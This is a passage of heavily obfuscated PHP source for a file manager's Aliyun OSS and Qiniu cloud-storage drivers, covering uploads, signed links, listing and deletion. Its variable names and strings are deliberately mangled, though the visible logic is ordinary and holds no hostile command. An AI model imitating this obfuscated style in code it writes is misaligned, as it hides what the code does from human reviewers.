$ËŒ«¨ß) { $¾Œ¤™¹é =& $_SERVER[íû‘ş´]; $èŸ¦¹Òá = parse_url_query($ËŒ«¨ß[$¾Œ¤™¹é[175]]); $µÀù‡© = $this->client->listParts($this->bucket, $this->pathEncode($ÚúĞ¬), $èŸ¦¹Òá[$¾Œ¤™¹é[238]]); $Åó¼²ïÂ = $µÀù‡©->getListPart(); $¬±ÔèÑş = array(); foreach ($Åó¼²ïÂ as $ûû¸—ØÜ) { $¬±ÔèÑş[] = array($¾Œ¤™¹é[1447] => $ûû¸—ØÜ->getPartNumber(), $¾Œ¤™¹é[1448] => trim($ûû¸—ØÜ->getETag(), $¾Œ¤™¹é[118])); } unset($ËŒ«¨ß[$¾Œ¤™¹é[240]], $ËŒ«¨ß[$¾Œ¤™¹é[244]]); $¢·ÃØÑë = $this->multiUploadAuthData($ÚúĞ¬, $ËŒ«¨ß); if (empty($¢·ÃØÑë)) { return !1; } return array($¾Œ¤™¹é[249] => $¢·ÃØÑë, $¾Œ¤™¹é[239] => $ËŒ«¨ß[$¾Œ¤™¹é[239]], $¾Œ¤™¹é[251] => $¬±ÔèÑş); } public function download($ãÈ¼Ãïı, $ìâ¸ó¢£) { if ($this->isFolder($ãÈ¼Ãïı)) { return !1; } try { $ˆ¾ÖÓŒ¯ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ìâ¸ó¢£); $ˆ¾ÖÓŒ¯ = $this->trafficLimit($_SERVER[íû‘ş´][109], $ˆ¾ÖÓŒ¯); $this->client->getObject($this->bucket, $this->pathEncode($ãÈ¼Ãïı), $ˆ¾ÖÓŒ¯); } catch (OSS\Core\OssException $œ˜…­ëÓ) { return !1; } return $ìâ¸ó¢£; } public function fileSubstr($¯ê˜é, $»ğŠæÙ = 0, $øæÎüü = false) { if ($»ğŠæÙ === -1) { $‡×æë¤¹ = array(); } else { if ($øæÎüü === !1) { $Øå°õŒª = $this->size($¯ê˜é); } else { $Øå°õŒª = $»ğŠæÙ + $øæÎüü - 1; } $‡×æë¤¹ = array(OSS\OssClient::OSS_RANGE => "{$»ğŠæÙ}\x2d{$Øå°õŒª}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($¯ê˜é), $‡×æë¤¹); } catch (OSS\Core\OssException $“§ĞÙ‰È) { think_exception($“§ĞÙ‰È->getMessage()); return !1; } } private function trafficLimit($Ïîª¬Ÿ±, $¨±ìã¾ = array()) { $¹ó©ú÷ =& $_SERVER[íû‘ş´]; if ($Ïîª¬Ÿ± == $¹ó©ú÷[1453] && $this->isUploadServer() || $Ïîª¬Ÿ± == $¹ó©ú÷[109] && $this->isFileOutServer()) { return $¨±ìã¾; } $‚“ˆÏ•‡ = floatval($GLOBALS[$¹ó©ú÷[6]][$¹ó©ú÷[89]][$¹ó©ú÷[107]][$Ïîª¬Ÿ±]) * 1024 * 1024 * 8; if (!$‚“ˆÏ•‡) { return $¨±ìã¾; } $‚“ˆÏ•‡ = $‚“ˆÏ•‡ < 819200 ? 819200 : ($‚“ˆÏ•‡ > 838860800 ? 838860800 : $‚“ˆÏ•‡); $¨±ìã¾[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($‚“ˆÏ•‡); return $¨±ìã¾; } public function link($Ââ»ûÉÏ, $Ëá“çÍŠ = array()) { $ìú‰¿´Ô =& $_SERVER[íû‘ş´]; if (!$this->exist($Ââ»ûÉÏ) || $this->isFolder($Ââ»ûÉÏ)) { return !1; } try { $Ëá“çÍŠ = $this->trafficLimit($ìú‰¿´Ô[109], $Ëá“çÍŠ); $ŸÉè ¼‘ = $this->client->signUrl($this->bucket, $this->pathEncode($Ââ»ûÉÏ), 3600 * 12, $ìú‰¿´Ô[245], $Ëá“çÍŠ); return $this->getCdnLink($ŸÉè ¼‘); } catch (OSS\Core\OssException $ƒÑãßÃ´) { return !1; } } public function fileOut($ÑÈ÷¹û , $ÍÔ¡¼ïº = false, $âõƒ¹ƒÅ = false, $–¯ôİÌ´ = '') { $èó€‰™ê =& $_SERVER[íû‘ş´]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÑÈ÷¹û , $ÍÔ¡¼ïº, $âõƒ¹ƒÅ, $–¯ôİÌ´); } if (!$âõƒ¹ƒÅ) { $âõƒ¹ƒÅ = $this->pathThis($ÑÈ÷¹û ); } $âõƒ¹ƒÅ = rawurlencode($âõƒ¹ƒÅ); $ˆòëüñÑ = get_file_mime(get_path_ext($âõƒ¹ƒÅ)); if ($ˆòëüñÑ == $èó€‰™ê[232]) { return parent::fileOut($ÑÈ÷¹û , $ÍÔ¡¼ïº, $âõƒ¹ƒÅ, $–¯ôİÌ´); } $ÍÔ¡¼ïº = $ÍÔ¡¼ïº ? $èó€‰™ê[1463] : $èó€‰™ê[1464]; $„â×ø”æ = array(OSS\OssClient::OSS_SUB_RESOURCE => $èó€‰™ê[1465] . rawurlencode("{$ÍÔ¡¼ïº}\73\146\x69\x6c\x65\156\x61\155\145\75{$âõƒ¹ƒÅ}")); $„â×ø”æ[OSS\OssClient::OSS_SUB_RESOURCE] .= $èó€‰™ê[1466] . rawurlencode($ˆòëüñÑ); $£÷§’ßâ = $this->link($ÑÈ÷¹û , $„â×ø”æ); $this->fileOutLink($£÷§’ßâ); } public function fileOutServer($Æ“†½×¡, $üïíÌõĞ = false, $™˜ãÊàè = false, $şòÏä¿ = '') { parent::fileOut($Æ“†½×¡, $üïíÌõĞ, $™˜ãÊàè, $şòÏä¿); } public function fileOutImage($—·Ä¨Ì, $¹ˆ¤èê = 250) { if ($this->size($—·Ä¨Ì) > 1024 * 1024 * 20) { return $this->fileOutImageServer($—·Ä¨Ì, $¹ˆ¤èê); } $”ôÙÀŞ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[íû‘ş´][1467] . $¹ˆ¤èê); $Ëñ´ ¨Ò = $this->link($—·Ä¨Ì, $”ôÙÀŞ); $this->fileOutLink($Ëñ´ ¨Ò); } public function fileOutImageServer($«û‰ºˆ±, $ØŸ¹ò©Ñ = 250) { parent::fileOutImage($«û‰ºˆ±, $ØŸ¹ò©Ñ); } public function fileOutLink($ó®ºÃğ) { $å™¶ÈîŞ =& $_SERVER[íû‘ş´]; if (!$this->isCdnHost() && substr($ó®ºÃğ, 0, 7) == $å™¶ÈîŞ[1388]) { $ó®ºÃğ = $å™¶ÈîŞ[1389] . substr($ó®ºÃğ, 7); } header($å™¶ÈîŞ[162] . $ó®ºÃğ); die; } public function hashMd5($µÆˆØè, $üâè¥‰ó = '') { $¾ÓÔÅÚ =& $_SERVER[íû‘ş´]; $¼›‡‰×Ø = $this->_objectMeta($µÆˆØè); if (!$¼›‡‰×Ø) { return $¾ÓÔÅÚ[12]; } if (!isset($¼›‡‰×Ø[$¾ÓÔÅÚ[1443]]) && !empty($üâè¥‰ó)) { $ˆù•û±õ = $this->updateObjMeta($µÆˆØè, array($¾ÓÔÅÚ[1443] => $üâè¥‰ó)); $¼›‡‰×Ø[$¾ÓÔÅÚ[1443]] = $ˆù•û±õ ? $üâè¥‰ó : $¾ÓÔÅÚ[12]; } return isset($¼›‡‰×Ø[$¾ÓÔÅÚ[1443]]) ? strtolower($¼›‡‰×Ø[$¾ÓÔÅÚ[1443]]) : $¾ÓÔÅÚ[12]; } public function size($°¾õÖ°ø) { $ŒŞëÂ«¶ = $this->objectMeta($°¾õÖ°ø); return $ŒŞëÂ«¶ ? $ŒŞëÂ«¶[$_SERVER[íû‘ş´][76]] : 0; } public function info($âè¾Å•) { if ($this->isFolder($âè¾Å•)) { return $this->folderInfo($âè¾Å•); } else { if ($this->isFile($âè¾Å•)) { return $this->fileInfo($âè¾Å•); } } return !1; } public function exist($¯‘àè) { return $this->isFile($¯‘àè) || $this->isFolder($¯‘àè); } public function isFile($ÎàõÕ™) { return !$this->isFolder($ÎàõÕ™) && $this->objectMeta($ÎàõÕ™); } public function isFolder($ëÅ­Ì„) { return $this->cacheMethod($_SERVER[íû‘ş´][166], $ëÅ­Ì„); } protected function objectMeta($Ù€µ) { return $this->cacheMethod($_SERVER[íû‘ş´][168], $Ù€µ); } protected function _objectMeta($ÈÚ¯±) { $¢Ô£¢ıÆ =& $_SERVER[íû‘ş´]; try { $óöµúè = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÈÚ¯±)); } catch (OSS\Core\OssException $—Şë‘¨¤) { $óöµúè = !1; } if ($óöµúè) { $óöµúè[$¢Ô£¢ıÆ[76]] = intval($óöµúè[$¢Ô£¢ıÆ[1441]]); } return $óöµúè; } protected function _isFolder($Øøö¥¯ú) { $–®œ¡œç =& $_SERVER[íû‘ş´]; if ($Øøö¥¯ú == $–®œ¡œç[12] || $Øøö¥¯ú == $–®œ¡œç[8]) { return !0; } $Ø„úùÓ = array($–®œ¡œç[1436] => $–®œ¡œç[8], $–®œ¡œç[1437] => rtrim($Øøö¥¯ú, $–®œ¡œç[8]) . $–®œ¡œç[8], $–®œ¡œç[1438] => 1, $–®œ¡œç[1439] => $–®œ¡œç[12]); $…‘—ª¼ = $this->client->listObjects($this->bucket, $Ø„úùÓ); if ($…‘—ª¼->getObjectList() || $…‘—ª¼->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ÔÇ»î¹Ô) { parent::__construct(); require_once SDK_DIR . $_SERVER[íû‘ş´][1468]; $this->_init($ÔÇ»î¹Ô); } public function _init($¡Ç˜òõ·) { $íµ¿Úª“ =& $_SERVER[íû‘ş´]; $this->config = $¡Ç˜òõ·; foreach ($¡Ç˜òõ· as $©ÂğçØ« => $™şş÷Å) { if (isset($this->{$©ÂğçØ«})) { $this->{$©ÂğçØ«} = $™şş÷Å; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($íµ¿Úª“[1469] . LNG($íµ¿Úª“[1427])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($í‘œÒ½ì, $öó§ïùã = '', $äè¡Õ² = REPEAT_RENAME) { if ($this->setContent($í‘œÒ½ì, $öó§ïùã)) { return $this->getPathOuter($í‘œÒ½ì); } return !1; } public function mkdir($Æß“¢¶¿, $ÒÃÔğàÇ = REPEAT_SKIP) { $×ÅôÍÜİ =& $_SERVER[íû‘ş´]; $ŠÑÎ§² = trim($Æß“¢¶¿, $×ÅôÍÜİ[8]); if ($this->_isFolder($ŠÑÎ§²)) { return $this->getPathOuter($ŠÑÎ§²); } $Æß“¢¶¿ = $ŠÑÎ§² . $×ÅôÍÜİ[8]; $ÕÆ™‚ë = get_path_this($ŠÑÎ§²); $»ß™ïØ = $Æß“¢¶¿ . $ÕÆ™‚ë; if (!$this->mkfile($»ß™ïØ)) { return !1; } if (!$this->moveFile($»ß™ïØ, $Æß“¢¶¿)) { $this->delFile($»ß™ïØ); return !1; } return $this->getPathOuter($ŠÑÎ§²); } public function copyFile($Ï“ıê…ø, $†øºãè) { $á‹Ûƒš® = $this->bucketManager->copy($this->bucket, $Ï“ıê…ø, $this->bucket, $†øºãè, !0); return $á‹Ûƒš® ? !1 : $this->getPathOuter($†øºãè); } public function moveFile($µ†âú¦Œ, $Ëû­¸¡³) { $ÆÛÒ¨í = $this->bucketManager->move($this->bucket, $µ†âú¦Œ, $this->bucket, $Ëû­¸¡³, !0); return $ÆÛÒ¨í ? !1 : $this->getPathOuter($Ëû­¸¡³); } public function delFile($¶è ·•º) { if (!$this->exist($¶è ·•º)) { return !0; } $Ò®èÕª‰ = $this->bucketManager->delete($this->bucket, $¶è ·•º); return $Ò®èÕª‰ ? !1 : !0; } public function delFolder($Ü†ğ™ä¶) { $½±àÂÇŸ =& $_SERVER[íû‘ş´]; if (!$this->exist($Ü†ğ™ä¶)) { return !0; } $this->listItemCache = !1; $·˜Ø²‚ğ = $this->fileList($Ü†ğ™ä¶); $this->listItemCache = !0; $“µı×êİ = trim($Ü†ğ™ä¶, $½±àÂÇŸ[8]) . $½±àÂÇŸ[8]; if (!empty($Ü†ğ™ä¶) && $Ü†ğ™ä¶ !== $½±àÂÇŸ[212] && !in_array($“µı×êİ, $·˜Ø²‚ğ[$½±àÂÇŸ[82]])) { $·˜Ø²‚ğ[$½±àÂÇŸ[82]][] = $“µı×êİ; } $àüåûá× = $this->delByBatch($·˜Ø²‚ğ[$½±àÂÇŸ[83]]); if (!$àüåûá×) { return !1; } $àüåûá× = $this->delByBatch($·˜Ø²‚ğ[$½±àÂÇŸ[82]]); if (!$àüåûá×) { return !1; } return $this->delFile($“µı×êİ); } private function delByBatch($¼‘ÈååØ) { foreach (array_chunk($¼‘ÈååØ, 1000) as $œ÷‘âİÏ) { $Ã ‡Ÿƒ = $this->bucketManager->buildBatchDelete($this->bucket, $œ÷‘âİÏ); list($ì×ÖÃóö, $éò¡Í–Æ) = $this->bucketManager->batch($Ã ‡Ÿƒ); if ($éò¡Í–Æ) { return !1; } } return !0; } public function rename($â£¾øî, $ÌóÕ°âñ) { return $this->renameObject($â£¾øî, $ÌóÕ°âñ); } public function fileInfo($­¼º’Ôä, $¯ğƒÒ¼¤ = false, $¹¾Ä†î = array()) { $¤É®ûÌ” =& $_SERVER[íû‘ş´]; $Ïş¿îªÇ = array($¤É®ûÌ”[32] => $this->pathThis($­¼º’Ôä), $¤É®ûÌ”[84] => $this->getPathOuter($¤É®ûÌ”[8] . $­¼º’Ôä), $¤É®ûÌ”[33] => $¤É®ûÌ”[214], $¤É®ûÌ”[76] => isset($¹¾Ä†î[$¤É®ûÌ”[1470]]) ? $¹¾Ä†î[$¤É®ûÌ”[1470]] : 0, $¤É®ûÌ”[175] => $this->ext($­¼º’Ôä)); if ($¯ğƒÒ¼¤) { return $Ïş¿îªÇ; } $Ïş¿îªÇ[$¤É®ûÌ”[215]] = $Ïş¿îªÇ[$¤É®ûÌ”[85]] = 0; $Ïş¿îªÇ[$¤É®ûÌ”[216]] = $Ïş¿îªÇ[$¤É®ûÌ”[217]] = !0; if (empty($¹¾Ä†î)) { $¹¾Ä†î = $this->objectMeta($­¼º’Ôä); if (!$¹¾Ä†î) { return $Ïş¿îªÇ; } } if (isset($¹¾Ä†î[$¤É®ûÌ”[218]]) && $¹¾Ä†î[$¤É®ûÌ”[218]]) { $Ïş¿îªÇ[$¤É®ûÌ”[219]] = $¹¾Ä†î[$¤É®ûÌ”[218]]; } if (isset($¹¾Ä†î[$¤É®ûÌ”[228]]) && $¹¾Ä†î[$¤É®ûÌ”[228]]) { $Ïş¿îªÇ[$¤É®ûÌ”[219]] = $¹¾Ä†î[$¤É®ûÌ”[228]]; } if (isset($¹¾Ä†î[$¤É®ûÌ”[1471]])) { $Ïş¿îªÇ[$¤É®ûÌ”[85]] = substr($¹¾Ä†î[$¤É®ûÌ”[1471]] . $¤É®ûÌ”[12], 0, 10); } if (isset($¹¾Ä†î[$¤É®ûÌ”[1470]])) { $Ïş¿îªÇ[$¤É®ûÌ”[76]] = $¹¾Ä†î[$¤É®ûÌ”[1470]]; } return $Ïş¿îªÇ; } public function folderInfo($™éÈ­©Ñ, $Ï™œâÄŞ = false) { $¼ÏÆß³ =& $_SERVER[íû‘ş´]; $øº´¶ªÕ = array($¼ÏÆß³[32] => $this->pathThis($™éÈ­©Ñ), $¼ÏÆß³[84] => $this->getPathOuter($¼ÏÆß³[8] . $™éÈ­©Ñ), $¼ÏÆß³[33] => $¼ÏÆß³[75]); if ($Ï™œâÄŞ) { return $øº´¶ªÕ; } $øº´¶ªÕ[$¼ÏÆß³[215]] = $øº´¶ªÕ[$¼ÏÆß³[85]] = 0; $øº´¶ªÕ[$¼ÏÆß³[216]] = $øº´¶ªÕ[$¼ÏÆß³[217]] = !0; $™éÈ­©Ñ = rtrim($™éÈ­©Ñ, $¼ÏÆß³[8]) . $¼ÏÆß³[8]; $Œô½²Ûİ = $this->objectMeta($™éÈ­©Ñ); if (isset($Œô½²Ûİ[$¼ÏÆß³[1471]])) { $øº´¶ªÕ[$¼ÏÆß³[85]] = substr($Œô½²Ûİ[$¼ÏÆß³[1471]] . $¼ÏÆß³[12], 0, 10); } return $øº´¶ªÕ; } public function listPath($êş‹œ×€, $Ú®Äª = false) { $÷İÔÓ =& $_SERVER[íû‘ş´]; $ëÚÁÕÓ§ = $this->fileList($êş‹œ×€, $÷İÔÓ[8], !0); foreach ($ëÚÁÕÓ§[$÷İÔÓ[82]] as $¹ı±ª¶ => $¯ÍÜ½Ì) { $ëÚÁÕÓ§[$÷İÔÓ[82]][$¹ı±ª¶] = $this->folderInfo($¯ÍÜ½Ì, $Ú®Äª); } foreach ($ëÚÁÕÓ§[$÷İÔÓ[83]] as $¹ı±ª¶ => $¯ÍÜ½Ì) { $ëÚÁÕÓ§[$÷İÔÓ[83]][$¹ı±ª¶] = $this->fileInfo($¯ÍÜ½Ì[$÷İÔÓ[94]], $Ú®Äª, $¯ÍÜ½Ì); } return $ëÚÁÕÓ§; } public function has($îàÅ©é, $º‹Æ‰ÕÔ = false, $åÒŞì”± = true) { $ùØÓ‰õş =& $_SERVER[íû‘ş´]; $îàÅ©é = trim($îàÅ©é, $ùØÓ‰õş[8]); $´Äß…Åœ = empty($îàÅ©é) && $îàÅ©é !== $ùØÓ‰õş[212] ? $ùØÓ‰õş[12] : $îàÅ©é . $ùØÓ‰õş[8]; $©™ô—‹ˆ = $ùØÓ‰õş[12]; $‹¡Õ‘¦â = 500; $¿ÊˆÚñ– = $ùØÓ‰õş[8]; $©ÒºÍ© = $ÌÒË»œÓ = 0; while (!0) { check_abort(); list($ˆËÂØÈÊ, $ğ£ƒ½) = $this->bucketManager->listFiles($this->bucket, $´Äß…Åœ, $©™ô—‹ˆ, $‹¡Õ‘¦â, $¿ÊˆÚñ–); if ($ğ£ƒ½) { break; } $©™ô—‹ˆ = array_key_exists($ùØÓ‰õş[1439], $ˆËÂØÈÊ) ? $©™ô—‹ˆ = $ˆËÂØÈÊ[$ùØÓ‰õş[1472]] : $ùØÓ‰õş[12]; if ($º‹Æ‰ÕÔ) { if (!empty($ˆËÂØÈÊ[$ùØÓ‰õş[1473]])) { $©ÒºÍ© += count($ˆËÂØÈÊ[$ùØÓ‰õş[1473]]); } if (!empty($ˆËÂØÈÊ[$ùØÓ‰õş[1474]])) { $ÌÒË»œÓ += count($ˆËÂØÈÊ[$ùØÓ‰õş[1474]]); } if ($©™ô—‹ˆ === $ùØÓ‰õş[12]) { break; } continue; } if ($åÒŞì”±) { if (!empty($ˆËÂØÈÊ[$ùØÓ‰õş[1473]])) { return !0; } } else { if (!empty($ˆËÂØÈÊ[$ùØÓ‰õş[1474]])) { return !0; } } if ($©™ô—‹ˆ === $ùØÓ‰õş[12]) { break; } } if ($º‹Æ‰ÕÔ) { return array($ùØÓ‰õş[223] => $©ÒºÍ©, $ùØÓ‰õş[224] => $ÌÒË»œÓ); } return !1; } public function listAll($›©†ë¦¿) { $’ŸÌà’ì =& $_SERVER[íû‘ş´]; $ÑÉ‡æ¡€ = $this->fileList($›©†ë¦¿, $’ŸÌà’ì[12], !0); $öœÕ÷«ª = array_to_keyvalue($ÑÉ‡æ¡€[$’ŸÌà’ì[83]], $’ŸÌà’ì[32]); foreach ($ÑÉ‡æ¡€[$’ŸÌà’ì[82]] as $‡çÌÂ“) { if (is_string($‡çÌÂ“)) { $öœÕ÷«ª[$‡çÌÂ“] = array($’ŸÌà’ì[76] => 0); } } return $this->listAllFiles($›©†ë¦¿, $öœÕ÷«ª); } private function fileList($©ıëÚ×, $„é—Ëõê = '', $ó‹›Œ¯ = 0) { $™Ì½şŸê =& $_SERVER[íû‘ş´]; $©ıëÚ× = trim($©ıëÚ×, $™Ì½şŸê[8]); $Ñäš…¢ = empty($©ıëÚ×) && $©ıëÚ× !== $™Ì½şŸê[212] ? $™Ì½şŸê[12] : $©ıëÚ× . $™Ì½şŸê[8]; $ßŠÔŞÄõ = $™Ì½şŸê[12]; $‰©‚Ã´Í = 1000; $Ñî«³ÔÇ = $‚¦ˆ©ÏÂ = array(); while (!0) { check_abort(); list($Å¼¼ò•ı, $ŸÔ¿) = $this->bucketManager->listFiles($this->bucket, $Ñäš…¢, $ßŠÔŞÄõ, $‰©‚Ã´Í, $„é—Ëõê); if ($ŸÔ¿) { break; } $ßŠÔŞÄõ = array_key_exists($™Ì½şŸê[1439], $Å¼¼ò•ı) ? $ßŠÔŞÄõ = $Å¼¼ò•ı[$™Ì½şŸê[1472]] : $™Ì½şŸê[12]; $è±åè¶Ÿ = isset($Å¼¼ò•ı[$™Ì½şŸê[1473]]) ? $Å¼¼ò•ı[$™Ì½şŸê[1473]] : array(); $ÏĞ‡¸µÂ = isset($Å¼¼ò•ı[$™Ì½şŸê[1474]]) ? $Å¼¼ò•ı[$™Ì½şŸê[1474]] : array(); foreach ($è±åè¶Ÿ as $ÈĞ°ÛãÄ) { if ($ÈĞ°ÛãÄ[$™Ì½şŸê[94]] == $Ñäš…¢) { continue; } $Âè¶üÉ = $ÈĞ°ÛãÄ[$™Ì½şŸê[94]]; $¢ÎË…´¥ = $ÈĞ°ÛãÄ[$™Ì½şŸê[1470]]; $ÈĞ°ÛãÄ[$™Ì½şŸê[76]] = $¢ÎË…´¥; $õ–Ü„şĞ = $¢ÎË…´¥ == 0 && substr($Âè¶üÉ, strlen($Âè¶üÉ) - 1, 1) == $™Ì½şŸê[8] ? !0 : !1; $this->cacheMethodInfoSet($Âè¶üÉ, $õ–Ü„şĞ, $ÈĞ°ÛãÄ); if ($õ–Ü„şĞ) { $Ñî«³ÔÇ[] = $Âè¶üÉ; continue; } $‚¦ˆ©ÏÂ[] = $ó‹›Œ¯ ? $ÈĞ°ÛãÄ : $Âè¶üÉ; } foreach ($ÏĞ‡¸µÂ as $Âè¶üÉ) { if ($Âè¶üÉ == $Ñäš…¢) { continue; } $Ñî«³ÔÇ[] = $Âè¶üÉ; $this->cacheMethodInfoSet($Âè¶üÉ, !0); } if ($ßŠÔŞÄõ === $™Ì½şŸê[12]) { break; } } $this->cacheMethodInfoSet($©ıëÚ×, !0); return array($™Ì½şŸê[82] => $Ñî«³ÔÇ, $™Ì½şŸê[83] => $‚¦ˆ©ÏÂ); } public function canRead($íéÈ´¥•) { return $this->exist($íéÈ´¥•) ? !0 : !1; } public function canWrite($ÌÕú˜ã™) { return $this->exist($ÌÕú˜ã™) ? !0 : !1; } public function getContent($·ëçÔèô) { return $this->fileSubstr($·ëçÔèô, 0, -1); } public function setContent($ÓÎˆõùÄ, $€ØÎ«ƒë = '') { $˜îâ‘ = $this->tempFile($this->pathThis($ÓÎˆõùÄ)); file_put_contents($˜îâ‘, $€ØÎ«ƒë); if ($this->upload($ÓÎˆõùÄ, $˜îâ‘)) { $this->tempFileRemve($˜îâ‘); return !0; } return !1; } public function refreshUrls($œ§³…Ù¤) { $ºáñÇı— =& $_SERVER[íû‘ş´]; $Ş‰†ÙÚÕ = array(); if (is_array($œ§³…Ù¤)) { foreach ($œ§³…Ù¤ as $Åó‡…×) { $Ş‰†ÙÚÕ[] = $this->link($Åó‡…×); } } else { $Ş‰†ÙÚÕ[] = $this->link($œ§³…Ù¤); } $Ô‹ïØ·— = new Qiniu\Cdn\CdnManager($this->auth); list($£Óæ, $îóœ³•Ú) = $Ô‹ïØ·—->refreshUrls($Ş‰†ÙÚÕ); if ($îóœ³•Ú) { return !1; } return $£Óæ[$ºáñÇı—[1240]] == $ºáñÇı—[818] ? !0 : !1; } public function fileSubstr($§é‰Œë›, $‘©Š™Ğ½, $õ­ğÇ”) { $óä‚½®‚ =& $_SERVER[íû‘ş´]; if (!($©‰ùš®— = $this->link($§é‰Œë›))) { return !1; } $²Ú—ä¾ = !1; if ($õ­ğÇ” > 0) { $Ìˆ¹Ïç± = $‘©Š™Ğ½ + $õ­ğÇ” - 1; $²Ú—ä¾ = array($óä‚½®‚[1475] . $‘©Š™Ğ½ . $óä‚½®‚[430] . $Ìˆ¹Ïç±); } $ëâŞı¬ = url_request($©‰ùš®—, $óä‚½®‚[245], !1, $²Ú—ä¾); return $ëâŞı¬[$óä‚½®‚[809]] ? $ëâŞı¬[$óä‚½®‚[1260]] : !1; } public function upload($¾®Çñäõ, $›Ç£ëâ, $ôÍšì’… = false, $¯¿‰¯×î = REPEAT_REPLACE) { $áÂˆã«“ = new Qiniu\Storage\UploadManager(); $˜Ô„ùç = $this->auth->uploadToken($this->bucket, $¾®Çñäõ); $Áëâ¯É = get_file_mime(get_path_ext($›Ç£ëâ)); list($¾Œ•µ€÷, $‚üëŸèÅ) = $áÂˆã«“->putFile($˜Ô„ùç, $¾®Çñäõ, $›Ç£ëâ, null, $Áëâ¯É); return $‚üëŸèÅ ? !1 : $this->getPathOuter($¾®Çñäõ); } public function uploadFormData($«ı‡Ò×œ, $ˆì™Çêî = 3600) { return $this->uploadToken($«ı‡Ò×œ, $ˆì™Çêî); } public function multiUploadFormData($›€ëü‡, $›§îá¤¡ = 3600) { return $this->uploadToken($›€ëü‡, $›§îá¤¡); } private function uploadToken($¿½İÊ², $¼•æÊ = 3600) { $ôÑ…†–Š =& $_SERVER[íû‘ş´]; $Áò°¢â = $¼•æÊ; $ùÇé‹°  = array($ôÑ…†–Š[1476] => $ôÑ…†–Š[1477]); $ÃŒÍÜ«æ = $¿½İÊ²; $ÏÒ‰İ® = $this->auth->uploadToken($this->bucket, $ÃŒÍÜ«æ, $Áò°¢â, $ùÇé‹° , !0); $±õ±‚Ø = empty($this->region) || $this->region == $ôÑ…†–Š[1478] ? $ôÑ…†–Š[12] : $ôÑ…†–Š[430] . $this->region; $¦éø›ê = http_type() . "\x3a\57\x2f\x75\160\x6c\157\141\x64{$±õ±‚Ø}\x2e\x71\x69\156\x69\x75\x70\x2e\143\157\x6d\57"; return array($ôÑ…†–Š[1479] => $ÏÒ‰İ®, $ôÑ…†–Š[1480] => $¦éø›ê); } public function download($ÆÀ‚†ß„, $ø‰Şœ²) { $—¨·œ€ = IO::getPathInner(IO::mkfile($ø‰Şœ²)); if (!($¾ìøùŞ¨ = $this->link($ÆÀ‚†ß„))) { return !1; } $ôÖØï = 0; $ÏÆÔ†Æ§ = 1024 * 200; $àìåöÊì = fopen($—¨·œ€, $_SERVER[íû‘ş´][1481]); while (!0) { $ªİïìÈ› = $this->fileSubstr($ÆÀ‚†ß„, $ôÖØï, $ÏÆÔ†Æ§); if ($ªİïìÈ› === !1) { return !1; } fwrite($àìåöÊì, $ªİïìÈ›); $ôÖØï += $ÏÆÔ†Æ§; if (strlen($ªİïìÈ›) < $ÏÆÔ†Æ§) { break; } } fclose($àìåöÊì); return $ø‰Şœ²; } public function link($’¡ş‡Ğ×, $ÚâÏ€á = '') { if (!$this->isFile($’¡ş‡Ğ×)) { return !1; } $ª²»®ü = $this->getHost() . $_SERVER[íû‘ş´][8] . $this->pathEncode($’¡ş‡Ğ×) . $ÚâÏ€á; return $this->auth->privateDownloadUrl($ª²»®ü, 3600 * 12); } public function fileOut($ÕÌÙ‰öİ, $»è»¬¼ç = false, $×òâˆáƒ = false, $®ŠÎŞ±ç = '') { $ûØÚ—± =& $_SERVER[íû‘ş´]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÕÌÙ‰öİ, $»è»¬¼ç, $×òâˆáƒ, $®ŠÎŞ±ç); } if (!$×òâˆáƒ) { $×òâˆáƒ = $this->pathThis($ÕÌÙ‰öİ); } $¨×áŸèÊ = $»è»¬¼ç ? $ûØÚ—±[1482] . rawurlencode($×òâˆáƒ) : $ûØÚ—±[12]; $»œÛ”õâ = $this->link($ÕÌÙ‰öİ, $¨×áŸèÊ); $this->fileOutLink($»œÛ”õâ); } public function fileOutServer($°¥˜ÎÉ†, $Øà—“ê = false, $èœ¿¿èœ = false, $‹ßÄ¼Úú = '') { parent::fileOut($°¥˜ÎÉ†, $Øà—“ê, $èœ¿¿èœ, $‹ßÄ¼Úú); } public function fileOutImage($ü’Üƒß±, $Å¦Ê·Øª = 250) { $ëÙ‰İğÖ = $this->link($ü’Üƒß±, $_SERVER[íû‘ş´][1483] . $Å¦Ê·Øª); $this->fileOutLink($ëÙ‰İğÖ); } public function fileOutImageServer($›²Ê¶¿§, $†»¹ìñ³ = 250) { parent::fileOutImage($›²Ê¶¿§, $†»¹ìñ³); } public function hashMd5($À¦áÚèå) { $üÛ…ÎàÆ =& $_SERVER[íû‘ş´]; $í°®Â§Æ = $this->objectMeta($À¦áÚèå); return isset($í°®Â§Æ[$üÛ…ÎàÆ[228]]) ? $í°®Â§Æ[$üÛ…ÎàÆ[228]] : !1; $Ü“İ¨Â± = $this->link($À¦áÚèå, $üÛ…ÎàÆ[1484]); } public function size($´¸ŞöÁÌ) { $ˆÒş¹äÇ = $this->objectMeta($´¸ŞöÁÌ); return $ˆÒş¹äÇ ? $ˆÒş¹äÇ[$_SERVER[íû‘ş´][76]] : 0; } public function info($ö¹ãò‘•) { if ($this->isFolder($ö¹ãò‘•)) { return $this->folderInfo($ö¹ãò‘•); } else { if ($this->isFile($ö¹ãò‘•)) { return $this->fileInfo($ö¹ãò‘•); } } return !1; } public function exist($åä¡ß) { return $this->isFile($åä¡ß) || $this->isFolder($åä¡ß); } public function isFile($±½ëÄÀ®) { return !$this->isFolder($±½ëÄÀ®) && $this->objectMeta($±½ëÄÀ®); } public function isFolder($­†à¬) { return $this->cacheMethod($_SERVER[íû‘ş´][166], $­†à¬); } protected function 